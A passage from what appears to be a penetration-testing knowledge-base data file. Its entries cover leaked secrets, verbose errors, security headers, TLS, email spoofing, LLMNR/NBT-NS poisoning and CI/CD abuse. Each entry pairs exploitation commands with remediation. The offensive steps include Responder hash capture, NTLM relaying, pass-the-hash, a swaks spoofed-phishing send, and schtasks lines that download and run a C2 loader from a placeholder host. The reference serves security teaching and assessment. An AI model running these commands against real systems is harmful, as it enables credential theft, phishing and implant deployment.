              "Add a CI check that fails if deployable artifacts contain VCS or backup files."
            ]
          }
        ]
      },
      {
        id: "secrets-exposure",
        name: "Exposed Secrets & API Keys",
        severity: "High",
        ref: "https://owasp.org/www-community/vulnerabilities/Use_of_hard-coded_credentials",
        description: "Credentials and API keys leaked in client-side code, repos, or responses grant direct access to backends.",
        brief: "Applications leak secrets in many places: hardcoded in front-end JavaScript, committed to public repositories, left in config files, or returned in API responses and error messages. A single leaked cloud key, database credential, or third-party token gives direct access to backend systems — bypassing the application entirely.\n\nImpact: ranges from abusing a paid API to full cloud-account compromise, depending on the secret. Finding and rotating leaked secrets, and keeping them out of anything client-reachable, is the defence.",
        quickReference: [
          { label: "Mine front-end JS", cmd: "grep -oiE '(api[_-]?key|secret|token|bearer)[\"'\\'':= ]+[A-Za-z0-9_\\-]{16,}' app.js" },
          { label: "Public repos", cmd: "GitHub code search: \"target.com\" api_key ; org:target filename:.env" },
          { label: "Repo history scan", cmd: "trufflehog git file://./repo ; gitleaks detect -s ./repo" },
          { label: "Common locations", cmd: "JS bundles, /.env, config files, source maps (.js.map), API/error responses" }
        ],
        sections: [
          {
            title: "How It's Exploited",
            type: "commands",
            commands: [
              { label: "1. Harvest front-end JavaScript", cmd: "# collect every script, including source maps:\nfor u in $(cat js_urls.txt); do curl -s $u -o \"loot/$(basename $u)\"; done\ngrep -rniE '(api[_-]?key|secret|token|password|bearer)[\"'\\'':= ]+[A-Za-z0-9_-]{16,}' loot/" },
              { label: "2. Search public code", cmd: "# GitHub code/secret search for the org and domain:\n\"target.com\" api_key      org:target filename:.env\n# also gists and archived pages (Wayback) of old JS bundles" },
              { label: "3. Scan repositories and history", cmd: "trufflehog git file://./repo --json\ngitleaks detect -s ./repo -v\n# both flag live and historical secrets with the rule that matched" },
              { label: "4. Pull secrets from API / error responses", cmd: "# tokens or connection strings sometimes echoed in output:\ncurl -s https://target/api/config | grep -iE 'key|token|conn'\n# trigger an error and read any leaked connection string" },
              { label: "5. Validate and use the key", cmd: "# confirm scope before acting (in scope only):\naws sts get-caller-identity          # AWS key validity + identity\n# DB creds -> connect; 3rd-party token -> call its API" }
            ]
          },
          {
            title: "Impact by Secret Type",
            type: "table",
            columns: ["Secret", "Consequence"],
            rows: [
              ["Cloud keys (AWS/GCP/Azure)", "Direct access to cloud resources — often full account compromise"],
              ["Database credentials", "Read/write the database directly"],
              ["Third-party API tokens", "Abuse paid/privileged services, pivot to partner systems"],
              ["Signing secrets", "Forge JWTs/sessions (see JWT Vulnerabilities)"],
              ["Internal service creds", "Reach internal APIs and infrastructure"]
            ]
          },
          {
            title: "Attack Chain",
            type: "table",
            columns: ["Step", "Action", "Result"],
            rows: [
              ["1", "Collect JS / repos / responses", "Corpus to search"],
              ["2", "Scan for secret patterns", "Candidate secrets"],
              ["3", "Validate the secret", "Confirmed live credential"],
              ["4", "Use it against the backend", "Direct backend/cloud access"]
            ]
          },
          {
            title: "Tools Used",
            type: "table",
            columns: ["Tool", "Purpose"],
            rows: [
              ["trufflehog / gitleaks", "Detect secrets in code and git history"],
              ["Burp / grep", "Mine JS bundles, source maps, and responses"],
              ["GitHub code search", "Find leaked secrets in public repos and gists"],
              ["cloud CLIs (aws/az/gcloud)", "Validate and scope a discovered key"]
            ]
          },
          {
            title: "References",
            type: "references",
            items: [
              { label: "OWASP — Use of hard-coded credentials", url: "https://owasp.org/www-community/vulnerabilities/Use_of_hard-coded_credentials" },
              { label: "OWASP — Secrets Management Cheat Sheet", url: "https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html" }
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Keep secrets server-side and out of anything the client receives; never ship an API key in front-end code — proxy the call instead.",
              "Use a secrets manager and inject secrets at runtime; never commit them to source control.",
              "Add pre-commit and CI secret scanning (gitleaks/trufflehog) to catch leaks before they ship.",
              "Rotate any exposed secret immediately and treat it as compromised, including in git history and archives.",
              "Scope keys tightly (least privilege, IP/referrer restrictions) so a leak is contained."
            ]
          }
        ]
      },
      {
        id: "verbose-errors",
        name: "Verbose Errors & Info Disclosure",
        severity: "Low",
        ref: "https://owasp.org/www-community/Improper_Error_Handling",
        description: "Stack traces and debug output reveal versions, paths, queries, and internals that aid further attacks.",
        brief: "When an application returns detailed error output — stack traces, SQL queries, file paths, framework versions, debug pages — it hands an attacker a map of its internals.\n\nImpact: individually minor, but together these leaks accelerate every other attack — confirming an injection, revealing the stack for targeted CVEs, exposing internal hostnames and paths, and occasionally offering a debug console with code execution. Production systems should show generic errors and log detail server-side.",
        quickReference: [
          { label: "Trigger errors", cmd: "Send malformed input, wrong types, a stray ', or a bad path" },
          { label: "Debug-mode tells", cmd: "Django/Flask debug page, ASP.NET yellow screen, Rails error, Whoops (PHP)" },
          { label: "What to harvest", cmd: "Framework + versions, file paths, SQL fragments, internal hostnames, stack frames" },
          { label: "Config leaks", cmd: "Debug endpoints, /server-status, verbose 500s, X-Powered-By headers" }
        ],
        sections: [
          {
            title: "How It's Exploited",
            type: "commands",
            commands: [
              { label: "1. Provoke errors deliberately", cmd: "# malformed/unexpected input across parameters and paths:\n?id=1'                 # DB error -> confirms + reveals query\nPOST with wrong Content-Type / a string where a number is expected\nGET /nonexistent%00     # bad path -> stack trace" },
              { label: "2. Read the fingerprint from the response", cmd: "# harvest from the error body + headers:\ncurl -sI https://target | grep -iE 'server|x-powered-by|x-aspnet-version'\n# stack traces reveal framework, version, absolute file paths, code structure" },
              { label: "3. Look for a debug console left on", cmd: "# Flask/Werkzeug debugger, Django DEBUG=True, Symfony profiler, Rails web-console\n# Werkzeug's interactive debugger can execute Python if reachable (and PIN-bypassable)" },
              { label: "4. Map the stack to known CVEs", cmd: "# version banners -> searchsploit / advisories:\nsearchsploit <framework> <version>\n# absolute paths feed LFI/traversal; SQL fragments confirm injection structure" },
              { label: "5. Aggregate the leaks", cmd: "# combine tech stack + paths + internal hostnames to plan targeted exploitation\n# a single verbose 500 often turns a blind bug into a confirmed one" }
            ]
          },
          {
            title: "What Gets Leaked",
            type: "table",
            columns: ["Leak", "Use to an attacker"],
            rows: [
              ["Stack traces", "Framework, versions, and code paths for targeted exploitation"],
              ["SQL in errors", "Confirms injection and reveals query structure"],
              ["File paths", "Absolute paths aid LFI/traversal and reveal the OS/layout"],
              ["Version banners", "Map to known CVEs (X-Powered-By, Server headers, generator tags)"],
              ["Debug consoles", "Some debug pages allow code execution (e.g. Werkzeug console)"]
            ]
          },
          {
            title: "Attack Chain",
            type: "table",
            columns: ["Step", "Action", "Result"],
            rows: [
              ["1", "Force errors with bad input", "Verbose error output"],
              ["2", "Harvest stack/versions/paths", "Internal fingerprint"],
              ["3", "Map versions to CVEs / confirm a bug", "Targeted exploit path"],
              ["4", "Abuse a live debug console (if any)", "Code execution"]
            ]
          },
          {
            title: "Tools Used",
            type: "table",
            columns: ["Tool", "Purpose"],
            rows: [
              ["Burp Suite / curl", "Trigger and inspect error responses and headers"],
              ["Nikto / Nuclei", "Flag verbose errors, debug modes, info-disclosure headers"],
              ["searchsploit", "Map leaked versions to known exploits"]
            ]
          },
          {
            title: "References",
            type: "references",
            items: [
              { label: "OWASP — Improper Error Handling", url: "https://owasp.org/www-community/Improper_Error_Handling" },
              { label: "OWASP WSTG — Testing for Error Handling", url: "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/08-Testing_for_Error_Handling/" }
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Disable debug mode in production and return generic error pages to users; log the detail server-side only.",
              "Strip version-revealing headers (X-Powered-By, detailed Server) and framework banners.",
              "Handle exceptions centrally so no raw stack trace ever reaches the client.",
              "Remove or protect debug endpoints, consoles, and status pages (e.g. /server-status).",
              "Review error responses across the app, including APIs, not just the main pages."
            ]
          }
        ]
      },
      {
        id: "missing-security-headers",
        name: "Missing Security Headers",
        severity: "Low",
        ref: "https://owasp.org/www-project-secure-headers/",
        description: "Absent HTTP security headers remove browser-side defenses against XSS, clickjacking, and downgrade.",
        brief: "Modern browsers enforce a set of protections that the server must opt into via response headers. When they are missing, the browser's defense-in-depth against XSS, clickjacking, MIME sniffing, and protocol downgrade is simply not active.\n\nImpact: no single missing header is critical, but their absence weakens the whole client-side posture and amplifies other bugs (a missing CSP turns a small XSS into a full one; missing frame-ancestors enables clickjacking). Setting them is cheap, high-value hardening.",
        quickReference: [
          { label: "Check headers", cmd: "curl -sI https://target.com   (inspect the response headers)" },
          { label: "The important ones", cmd: "Content-Security-Policy, Strict-Transport-Security, X-Content-Type-Options, X-Frame-Options / frame-ancestors" },
          { label: "Scan", cmd: "nuclei -tags misconfig,headers ; or a headers-focused checker" },
          { label: "Cookie flags too", cmd: "Set-Cookie: Secure; HttpOnly; SameSite" }
        ],
        sections: [
          {
            title: "How It's Exploited",
            type: "commands",
            commands: [
              { label: "1. Inspect the response headers", cmd: "curl -sI https://target | grep -iE 'content-security-policy|strict-transport|x-frame|x-content-type|referrer-policy|permissions-policy'\n# note which are absent -> each is a disabled browser defence" },
              { label: "2. No CSP -> amplify XSS", cmd: "# with no Content-Security-Policy, any reflected/stored XSS runs unrestricted:\n#   inline <script>, external script loads, and exfil all succeed\n# a small injection becomes full session theft" },
              { label: "3. No X-Frame-Options / frame-ancestors -> clickjack", cmd: "<iframe src=\"https://target/settings\"></iframe>   # renders -> framable\n# overlay a decoy to hijack clicks (see Clickjacking)" },
              { label: "4. No HSTS -> downgrade / SSL-strip", cmd: "# without Strict-Transport-Security, a MitM can force http:// and strip TLS\n# first-visit and mixed-content requests are interceptable" },
              { label: "5. Weak cookie flags -> theft/CSRF", cmd: "# Set-Cookie missing HttpOnly -> XSS can read it\n# missing Secure -> sent over http; missing SameSite -> cross-site delivery (CSRF)" }
            ]
          },
          {
            title: "Key Headers",
            type: "table",
            columns: ["Header", "Protects against"],
            rows: [
              ["Content-Security-Policy", "XSS and data injection — the highest-value header when done well"],
              ["Strict-Transport-Security (HSTS)", "Protocol downgrade and SSL-strip"],
              ["X-Content-Type-Options: nosniff", "MIME sniffing that turns uploads into script"],
              ["X-Frame-Options / frame-ancestors", "Clickjacking (framing)"],
              ["Referrer-Policy", "Leaking URLs/tokens via the Referer header"],
              ["Permissions-Policy", "Unwanted access to browser features (camera, geolocation)"]
            ]
          },
          {
            title: "Attack Chain",
            type: "table",
            columns: ["Step", "Action", "Result"],
            rows: [
              ["1", "Inspect response headers", "Missing defences identified"],
              ["2", "Find a paired bug (XSS/framing/MitM)", "Amplification opportunity"],
              ["3", "Exploit without the browser control", "Fuller impact than otherwise"],
              ["4", "Abuse weak cookie flags", "Session theft / CSRF"]
            ]
          },
          {
            title: "Tools Used",
            type: "table",
            columns: ["Tool", "Purpose"],
            rows: [
              ["curl / browser dev-tools", "Inspect headers and cookie attributes"],
              ["Nuclei", "Grade the security-header set automatically"],
              ["Mozilla Observatory / securityheaders", "Scored external header assessment"]
            ]
          },
          {
            title: "References",
            type: "references",
            items: [
              { label: "OWASP — Secure Headers Project", url: "https://owasp.org/www-project-secure-headers/" },
              { label: "MDN — HTTP security headers", url: "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers" }
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Set a strong Content-Security-Policy — the most impactful header; start in report-only mode and tighten.",
              "Enable HSTS with a long max-age (and preload once confident), plus X-Content-Type-Options: nosniff.",
              "Set frame-ancestors (CSP) and/or X-Frame-Options to prevent framing.",
              "Set Secure, HttpOnly, and SameSite on session cookies.",
              "Apply headers centrally (at the framework or edge/proxy) so every response is covered consistently."
            ]
          }
        ]
      },
      {
        id: "weak-tls",
        name: "Weak TLS / SSL Configuration",
        severity: "Medium",
        ref: "https://ssl-config.mozilla.org/",
        description: "Outdated protocols, weak ciphers, or bad certificates undermine transport security and enable interception.",
        brief: "TLS protects data in transit, but only if it is configured well. Support for obsolete protocols (SSLv3, TLS 1.0/1.1), weak cipher suites, small keys, or broken certificate validation opens the door to downgrade and interception — and, historically, named exploits (POODLE, BEAST, Heartbleed).\n\nImpact: interception or tampering of traffic and erosion of trust; certificate problems can enable man-in-the-middle. The fix is a modern, minimal protocol/cipher configuration plus proper certificate management.",
        quickReference: [
          { label: "Scan the config", cmd: "testssl.sh https://target.com   or   sslscan target.com:443" },
          { label: "nmap ciphers", cmd: "nmap --script ssl-enum-ciphers -p443 target.com" },
          { label: "Red flags", cmd: "SSLv3, TLS 1.0/1.1, RC4/3DES/EXPORT ciphers, RSA<2048, expired/self-signed cert" },
          { label: "Reference config", cmd: "Mozilla SSL Configuration Generator (Intermediate/Modern)" }
        ],
        sections: [
          {
            title: "How It's Exploited",
            type: "commands",
            commands: [
              { label: "1. Enumerate protocols and ciphers", cmd: "testssl.sh https://target             # full protocol/cipher/vuln report\nsslscan target:443\nnmap --script ssl-enum-ciphers -p443 target   # grades each suite" },
              { label: "2. Flag the weaknesses", cmd: "# red flags in the output:\nSSLv3 / TLSv1.0 / TLSv1.1 offered\nRC4 / 3DES / EXPORT / NULL ciphers\nRSA key < 2048, SHA-1 signature, no forward secrecy" },
              { label: "3. Inspect the certificate", cmd: "echo | openssl s_client -connect target:443 -servername target 2>/dev/null | openssl x509 -noout -dates -issuer -subject\n# expired? self-signed on prod? hostname mismatch? weak sig?" },
              { label: "4. Assess the practical attack", cmd: "# no HSTS + TLS1.0 -> SSL-strip/downgrade by an on-path attacker\n# known-vuln checks: testssl.sh reports Heartbleed/POODLE/ROBOT if present" },
              { label: "5. Demonstrate impact (in scope)", cmd: "# on a controlled network path, show downgrade/interception of a test session\n# report the exact weak protocols/ciphers and cert problems found" }
            ]
          },
          {
            title: "Weaknesses to Check",
            type: "table",
            columns: ["Issue", "Risk"],
            rows: [
              ["Old protocols", "SSLv3 / TLS 1.0 / 1.1 enabled — downgrade and known attacks"],
              ["Weak ciphers", "RC4, 3DES, EXPORT, NULL, or anything without forward secrecy"],
              ["Small keys / weak sig", "RSA < 2048, SHA-1 certificates"],
              ["Certificate issues", "Expired, self-signed on production, wrong hostname, untrusted CA"],
              ["Missing HSTS", "No enforcement of HTTPS, enabling SSL-strip (see Missing Security Headers)"]
            ]
          },
          {
            title: "Attack Chain",
            type: "table",
            columns: ["Step", "Action", "Result"],
            rows: [
              ["1", "Scan protocols/ciphers/cert", "Weak configuration mapped"],
              ["2", "Identify downgrade/known-vuln exposure", "Concrete weakness"],
              ["3", "On-path downgrade / strip (in scope)", "Interceptable traffic"],
              ["4", "Capture or tamper data in transit", "Confidentiality/integrity loss"]
            ]
          },
          {
            title: "Tools Used",
            type: "table",
            columns: ["Tool", "Purpose"],
            rows: [
              ["testssl.sh", "Comprehensive TLS protocol/cipher/vuln assessment"],
              ["sslscan / sslyze", "Fast protocol and cipher enumeration"],
              ["nmap ssl-enum-ciphers", "Per-protocol cipher grading"],
              ["openssl s_client", "Manual certificate and handshake inspection"]
            ]
          },
          {
            title: "References",
            type: "references",
            items: [
              { label: "Mozilla — SSL Configuration Generator", url: "https://ssl-config.mozilla.org/" },
              { label: "OWASP — Transport Layer Security Cheat Sheet", url: "https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Security_Cheat_Sheet.html" }
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Support only TLS 1.2 and 1.3; disable SSLv3 and TLS 1.0/1.1 entirely.",
              "Use strong cipher suites with forward secrecy (ECDHE); remove RC4, 3DES, and EXPORT.",
              "Use 2048-bit+ RSA or ECDSA keys and SHA-256+ certificate signatures from a trusted CA.",
              "Enable HSTS to enforce HTTPS and prevent downgrade; keep certificates valid and monitored.",
              "Base the config on Mozilla's generator and re-scan after changes."
            ]
          }
        ]
      },
      {
        id: "email-spoofing",
        name: "Spoofable Email (SPF / DKIM / DMARC)",
        severity: "Medium",
        ref: "https://dmarc.org/",
        description: "Weak or missing email-authentication records let attackers send mail that appears to come from the domain.",
        brief: "SPF, DKIM, and DMARC are the DNS records that let receiving servers verify that mail claiming to be from a domain is authorised. When they are missing, misconfigured, or set to monitor-only (DMARC p=none), an attacker can spoof the domain — sending phishing that passes as legitimate internal or brand email.\n\nImpact: credible phishing and business-email-compromise under the organisation's own domain. The records are public, so the weakness is trivially assessed from the outside.",
        quickReference: [
          { label: "Check the records", cmd: "dig +short TXT target.com | grep spf1\ndig +short TXT _dmarc.target.com" },
          { label: "Weak DMARC", cmd: "v=DMARC1; p=none   -> monitor only, effectively spoofable" },
          { label: "SPF issues", cmd: "No SPF record, or ~all/+all (soft/pass) instead of -all" },
          { label: "Assess", cmd: "Online DMARC/SPF checkers; MXToolbox; or manual dig" }
        ],
        sections: [
          {
            title: "How It's Exploited",
            type: "commands",
            commands: [
              { label: "1. Read the public records", cmd: "dig +short TXT target.com | grep spf1        # SPF: -all vs ~all/+all vs none\ndig +short TXT _dmarc.target.com             # DMARC policy\ndig +short TXT selector._domainkey.target.com  # DKIM (guess/known selectors)" },
              { label: "2. Judge whether the domain is spoofable", cmd: "# spoofable if any of:\n#   no SPF record, or SPF ends ~all / +all\n#   no DMARC, or DMARC p=none\n#   no DKIM signing / no subdomain policy (sp=)\nspoofcheck.py target.com     # summarises the verdict" },
              { label: "3. Craft a spoofed message", cmd: "# with p=none, mail with a forged From: passes DMARC 'none' handling:\nswaks --to victim@corp --from ceo@target.com \\\n      --header 'Subject: Invoice' --server <open-relay-or-sender> --body phish.txt" },
              { label: "4. Improve deliverability", cmd: "# align envelope/visible domains, warm sender infra, match branding\n# subdomain spoofing where sp= is unset: from finance.target.com" },
              { label: "5. Confirm receipt", cmd: "# send to a controlled mailbox first; check it lands in inbox (not spam)\n# and that DMARC shows pass/none in the headers before the real campaign" }
            ]
          },
          {
            title: "The Three Records",
            type: "table",
            columns: ["Record", "Role"],
            rows: [
              ["SPF", "Lists IPs/hosts allowed to send for the domain; -all hard-fails others"],
              ["DKIM", "Cryptographically signs messages so tampering/forgery is detectable"],
              ["DMARC", "Ties SPF/DKIM to the visible From domain and sets the policy (none/quarantine/reject)"],
              ["Alignment", "DMARC passes only if SPF/DKIM align with the From domain"]
            ]
          },
          {
            title: "Attack Chain",
            type: "table",
            columns: ["Step", "Action", "Result"],
            rows: [
              ["1", "Query SPF/DKIM/DMARC records", "Authentication posture"],
              ["2", "Confirm weak/missing policy", "Domain is spoofable"],
              ["3", "Send spoofed mail from the domain", "Passes as legitimate"],
              ["4", "Phish employees/customers", "Credential theft / BEC"]
            ]
          },
          {
            title: "Tools Used",
            type: "table",
            columns: ["Tool", "Purpose"],
            rows: [
              ["dig / MXToolbox", "Read SPF/DKIM/DMARC DNS records"],
              ["spoofcheck / spoofy", "Automated spoofability verdict"],
              ["swaks", "Craft and send test spoofed messages"]
            ]
          },
          {
            title: "References",
            type: "references",
            items: [
              { label: "DMARC.org — Overview", url: "https://dmarc.org/" },
              { label: "M3AAWG — Email Authentication best practices", url: "https://www.m3aawg.org/" }
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Publish SPF listing only authorised senders and ending in -all (hard fail).",
              "Enable DKIM signing on all outbound mail streams.",
              "Set DMARC to p=quarantine, then p=reject after a monitoring period; include a subdomain policy (sp=).",
              "Use the DMARC rua/ruf reports to find and authorise legitimate senders before enforcing.",
              "Re-check the public records after changes; this is assessed entirely from outside."
            ]
          }
        ]
      },
      {
        id: "llmnr-nbtns",
        name: "LLMNR / NBT-NS Poisoning Enabled",
        severity: "High",
        ref: "https://attack.mitre.org/techniques/T1557/001/",
        theory: "theory/2026-08-18-coercion-ntlm-relay.html",
        description: "Legacy multicast name-resolution fallbacks let an attacker on the LAN capture NetNTLM hashes to crack or relay.",
        brief: "When Windows fails to resolve a name over DNS, it falls back to broadcasting the query to the local segment over LLMNR, NBT-NS, or mDNS. An attacker on the same segment answers 'that's me', and the victim authenticates to them — handing over a NetNTLM hash to crack offline or relay onward.\n\nImpact: credential capture and, via relay, lateral movement — one of the most reliable opening moves on an internal network because the fallbacks are rarely needed yet enabled by default. See the Coercion & NTLM Relay theory page.",
        quickReference: [
          { label: "Listen (recon)", cmd: "responder -I eth0 -A   (analyze only, no poisoning)" },
          { label: "Capture hashes", cmd: "responder -I eth0 -wd" },
          { label: "Crack", cmd: "hashcat -m 5600 hashes.txt rockyou.txt   (NetNTLMv2)" },
          { label: "Relay instead", cmd: "Disable Responder SMB/HTTP, then ntlmrelayx.py to unsigned targets" }
        ],
        sections: [
          {
            title: "How It's Exploited",
            type: "commands",
            commands: [
              { label: "1. Observe the traffic first (analyze mode)", cmd: "responder -I eth0 -A\n# passively see which hosts broadcast LLMNR/NBT-NS queries -> poisoning will work\n# (no answers sent yet -> non-disruptive recon)" },
              { label: "2. Poison and capture NetNTLMv2", cmd: "responder -I eth0 -wd\n# answers name queries; victims that mistype/hit a stale name authenticate to you\n# hashes are written to Responder's logs (and printed live)" },
              { label: "3. Crack the captured hashes offline", cmd: "hashcat -m 5600 hashes.txt rockyou.txt -r best64.rule\n# NetNTLMv2 -> weak passwords fall quickly -> valid domain credential" },
              { label: "4. Or relay instead of cracking", cmd: "# in Responder.conf set SMB = Off and HTTP = Off, then:\nntlmrelayx.py -tf unsigned_targets.txt -smb2support -i\n# the poisoned auth is relayed to a host that doesn't require SMB signing" },
              { label: "5. Use the credential / relayed access", cmd: "netexec smb <targets> -u user -H <nt-hash>       # PtH with a cracked/relayed cred\n# or --dump-sam / -c on the relayed session for lateral movement" }
            ]
          },
          {
            title: "The Fallback Protocols",
            type: "table",
            columns: ["Protocol", "Detail"],
            rows: [
              ["LLMNR (UDP 5355)", "The primary DNS fallback on modern Windows"],
              ["NBT-NS (UDP 137)", "Older NetBIOS name service, still commonly enabled"],
              ["mDNS (UDP 5353)", "Multicast DNS, another answerable path"],
              ["WPAD", "Proxy auto-discovery — prompts for auth via a rogue proxy"]
            ]
          },
          {
            title: "Attack Chain",
            type: "table",
            columns: ["Step", "Action", "Result"],
            rows: [
              ["1", "Analyze LLMNR/NBT-NS broadcasts", "Confirm poisoning viability"],
              ["2", "Poison and capture", "NetNTLMv2 hashes"],
              ["3", "Crack offline OR relay", "Cleartext cred or live session"],
              ["4", "Authenticate / move laterally", "Internal foothold"]
            ]
          },
          {
            title: "Tools Used",
            type: "table",
            columns: ["Tool", "Purpose"],
            rows: [
              ["Responder", "Poison LLMNR/NBT-NS/mDNS and capture NetNTLM hashes"],
              ["hashcat", "Crack NetNTLMv2 (mode 5600)"],
              ["Impacket ntlmrelayx", "Relay the captured authentication instead of cracking"],
              ["NetExec", "Use cracked/relayed creds for lateral movement"]
            ]
          },
          {
            title: "References",
            type: "references",
            items: [
              { label: "MITRE ATT&CK — LLMNR/NBT-NS Poisoning and Relay (T1557.001)", url: "https://attack.mitre.org/techniques/T1557/001/" },
              { label: "The Hacker Recipes — LLMNR/NBT-NS/mDNS spoofing", url: "https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/llmnr-nbtns-mdns-spoofing" }
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Disable LLMNR via Group Policy (Turn off multicast name resolution) — the primary fix.",
              "Disable NBT-NS on all interfaces (DHCP option or per-adapter setting) and disable mDNS where not needed.",
              "Require SMB signing and LDAP channel binding so any captured auth cannot be relayed.",
              "Ensure DNS is correct and complete so hosts rarely need to fall back to broadcast resolution.",
              "Monitor for LLMNR/NBT-NS responders and enforce strong passwords + MFA to blunt cracked hashes."
            ]
          }
        ]
      },
      {
        id: "cicd-abuse",
        name: "CI/CD Pipeline & Automation-Server Abuse",
        severity: "High",
        ref: "https://owasp.org/www-project-top-10-ci-cd-security-risks/",
        description: "Build and automation servers expose functionality — arbitrary build steps, script consoles, stored credentials, and build agents — that turns any user who can define or trigger a job into code execution, often as a privileged service account.",
        brief: "A CI/CD or automation server (Jenkins, TeamCity, GitLab/GitHub runners, Azure DevOps, Bamboo) exists to run code on demand. That is its purpose, and it is also the problem: a build step that runs an arbitrary shell or batch command, a built-in script console, an editable pipeline definition, or a plugin that shells out all give a user who can create or modify a job direct code execution on the server or its agents. Because builds usually run as a privileged service account and the server holds a credential store (deploy keys, cloud tokens, signing keys, service-account passwords), that execution frequently unlocks the wider environment rather than just one host.\n\nThis is a class of feature abuse, not a single product vulnerability. Weak or absent authentication, over-generous 'anyone can build' permissions, and readable job configuration turn the automation server into a foothold and a pivot: run commands, read the credential store, and move to whatever the pipeline was trusted to deploy to. In the lab this is the Jenkins-to-server step, but the same shape appears across every build system.",
        quickReference: [
          { label: "Recon the server", cmd: "nmap <host> -p 8080 -sC -sV -Pn   # + browse the UI (People tab leaks users)" },
          { label: "RCE via a build step", cmd: "Build step 'Execute shell/Windows batch command' -> your command" },
          { label: "RCE via script console", cmd: "Jenkins Script Console (Groovy) / equivalent -> code execution" },
          { label: "Loot", cmd: "Read the credential store, environment secrets, deploy keys" }
        ],
        sections: [
          {
            title: "How It's Exploited",
            type: "commands",
            commands: [
              { label: "1. Discover and fingerprint the automation server", cmd: "nmap <build-server> -p 8080 -sC -sV -Pn\n# browse the web UI; enumerate users (e.g. Jenkins 'People' tab), jobs and permissions\n# check for anonymous/weak auth and 'anyone can configure/build' settings" },
              { label: "2a. Code execution via a build-step command", cmd: "# in a job you can create or edit, add a build step that runs an OS command.\n# example: stage and run a C2 loader via scheduled tasks from a Windows batch step:\nschtasks /create /tn \"stage\" /sc ONSTART /tr \"cmd /c curl http://<c2>/loader.exe -o C:\\Windows\\Temp\\loader.exe\"\nschtasks /create /tn \"run\"   /sc ONSTART /tr \"C:\\Windows\\Temp\\loader.exe <c2> 8080 payload.bin\"\nschtasks /run /tn \"stage\"  &  schtasks /run /tn \"run\"\n# the build runs as the CI service account -> a foothold on the build host/agent" },
              { label: "2b. Code execution via a script console", cmd: "# many servers ship an admin scripting surface (Jenkins Groovy console, etc.)\n# reachable to over-privileged users -> direct in-process code execution:\n\"whoami\".execute().text        # Groovy example run from the console" },
              { label: "3. Harvest the credential store and pipeline secrets", cmd: "# CI servers store deploy/cloud/signing credentials for the pipelines they run:\n# print injected build environment / bound credentials, or read the credentials store,\n# then reuse those secrets against the systems the pipeline was trusted to deploy to." },
              { label: "4. Move to what the pipeline could reach", cmd: "# the build identity often has rights to deploy targets, artifact registries, and\n# cloud tenants. Pivot from the build host to those, or lateral-move with the harvested creds." }
            ]
          },
          {
            title: "Why It Works",
            type: "notes",
            items: [
              "Running arbitrary code is the intended function of a build server — a build step that executes a shell command is a feature, so 'RCE' here needs no memory-corruption exploit, only permission to define or trigger a job.",
              "Builds run as a shared, often privileged, service account rather than as the user who launched them, so a low-privileged contributor's job executes with the automation server's authority.",
              "The server is a credential concentrator: to deploy, it must hold secrets for every environment it deploys to, so one code-execution primitive exposes a store that reaches far beyond the build host.",
              "The common misconfigurations are permission defaults, not bugs: anonymous or weak authentication, 'anyone can build/configure', readable job config, and unrestricted plugins each widen who can reach the execution surface.",
              "Build agents multiply the blast radius — code runs on whatever pool of agents the job targets, and agents are frequently domain-joined and reused across projects."
            ]
          },
          {
            title: "Abusable Functionality",
            type: "table",
            columns: ["Feature", "How it becomes execution"],
            rows: [
              ["Build steps (Execute shell / batch)", "Directly runs attacker-supplied OS commands as the build account"],
              ["Script consoles (Groovy, etc.)", "In-process scripting surface = immediate code execution for privileged users"],
              ["Pipeline-as-code (Jenkinsfile / YAML)", "A committed pipeline definition runs on the server/agents on trigger"],
              ["Credential bindings / secret store", "Deploy keys, cloud tokens and service passwords exposed to the running job"],
              ["Plugins / integrations", "Extensions that shell out or evaluate expressions add more execution paths"],
              ["Build agents / runners", "Execution lands on domain-joined, reused agents — a lateral-movement launchpad"]
            ]
          },
          {
            title: "Tools Used",
            type: "table",
            columns: ["Tool", "Purpose"],
            rows: [
              ["nmap / browser", "Locate and fingerprint the server; enumerate users, jobs and permissions"],
              ["Native job/build steps", "The primary execution primitive — no exploit binary required"],
              ["schtasks / curl / loaders", "Stage and launch a C2 implant from a build step"],
              ["Sliver (pivot listener)", "Catch the foothold from the build host and pivot inward"]
            ]
          },
          {
            title: "References",
            type: "references",
            items: [
              { label: "OWASP Top 10 CI/CD Security Risks", url: "https://owasp.org/www-project-top-10-ci-cd-security-risks/" },
              { label: "MITRE ATT&CK — CI/CD / Cloud Administration abuse", url: "https://attack.mitre.org/techniques/T1651/" },
              { label: "The Hacker Recipes — CI/CD and build systems", url: "https://www.thehacker.recipes/" }
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Require authentication and enforce least-privilege authorization — remove anonymous access and 'anyone can build/configure'; separate who can view, trigger and edit jobs.",
              "Lock down or disable script consoles and restrict which users can define pipelines / edit build steps.",
              "Scope and vault credentials per pipeline, prefer short-lived tokens, and never expose broad standing secrets to arbitrary jobs.",
              "Run builds on isolated, least-privileged, ideally ephemeral agents that are not domain-joined admins, so a compromised build cannot pivot freely.",
              "Log and alert on job configuration changes, new build steps, and script-console use; review pipeline definitions in code review like any other code."
            ]
          }
        ]
      }
    ]
  }
];
